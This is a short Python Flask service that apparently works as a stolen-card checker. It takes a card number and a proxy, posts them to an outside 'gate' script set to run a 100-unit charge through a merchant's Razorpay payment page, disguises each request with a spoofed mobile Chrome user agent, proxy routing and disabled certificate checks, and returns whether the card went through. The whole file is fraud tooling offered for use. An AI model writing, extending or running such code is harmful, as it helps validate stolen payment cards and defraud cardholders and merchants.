from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

GATE_URL = "https://mydom.arpitchk.shop/autorz.php/"

@app.route('/gate=rz/cc=<card>', methods=['GET'])
def gate(card):
    proxy = request.args.get('proxy')
    if not proxy:
        return jsonify({"status": "error", "message": "proxy missing"}), 400

    # Clean proxy (remove http:// if user adds it)
    clean_proxy = proxy.replace("http://", "").replace("https://", "")

    # POST data exactly like the real gate expects
    data = {
        'cc': card,
        'url': 'https://razorpay.me/@ukinternational',
        'proxy': clean_proxy,
        'amount': '100'
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
    }

    proxies = {
        "http": f"http://{clean_proxy}",
        "https": f"http://{clean_proxy}"
    }

    try:
        # Send POST exactly like your working Python snippet
        r = requests.post(GATE_URL, data=data, headers=headers, proxies=proxies, timeout=40, verify=False)

        # Extract JSON from HTML (gate returns JSON inside <pre> or raw)
        match = re.search(r'\{.*"credit".*?\}', r.text, re.DOTALL)
        if match:
            result = match.group(0)
            json_data = requests.compat.json.loads(result)

            return jsonify({
                "status": json_data.get("status", "unknown"),
                "message": json_data.get("message", "No message")
            })

        return jsonify({"status": "failed", "message": "No JSON in response"})

    except Exception as e:
        return jsonify({"status": "gateway_error", "message": "Proxy dead or timeout"}), 502


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
